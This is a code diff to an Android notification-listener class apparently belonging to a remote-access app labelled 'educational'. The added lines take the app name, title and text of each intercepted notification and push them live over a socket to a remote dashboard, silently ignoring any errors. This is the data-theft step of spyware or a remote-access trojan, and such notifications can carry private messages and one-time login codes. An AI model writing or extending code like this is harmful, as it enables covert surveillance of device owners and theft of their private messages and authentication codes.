@@ -60,8 +60,17 @@ public class NotificationInterceptor extends NotificationListenerService {
                 }
             }
             
-            // You can send this to server via Socket.io
-            // SocketManager.getInstance().sendNotification(notification);
+            // Push live to dashboard
+            try {
+                com.remoteaccess.educational.network.SocketManager sm =
+                    com.remoteaccess.educational.network.SocketManager.getInstance(this);
+                if (sm != null && sm.isConnected()) {
+                    String appName = notification.optString("appName", sbn.getPackageName());
+                    String title   = notification.optString("title", "");
+                    String text    = notification.optString("text", "");
+                    sm.pushNotification(sbn.getPackageName(), appName, title, text, sbn.getPostTime());
+                }
+            } catch (Exception ignored) {}
             
         } catch (Exception e) {
             e.printStackTrace();
